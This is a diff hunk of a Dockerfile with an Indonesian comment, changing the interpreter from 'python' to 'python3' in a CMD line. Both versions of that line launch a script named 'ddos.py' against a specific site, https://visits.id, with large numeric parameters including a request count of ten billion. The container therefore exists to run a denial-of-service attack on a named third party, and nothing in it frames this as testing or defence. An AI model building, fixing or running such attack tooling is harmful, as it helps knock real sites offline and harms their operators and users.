@@ -11,4 +11,4 @@ COPY . .
 RUN pip install yarl  
 
 # Jalankan aplikasi (misal `script.py`)
-CMD ["python", "ddos.py https://visits.id 1600 800 10000000000"]
+CMD ["python3", "ddos.py https://visits.id 1600 800 10000000000"]
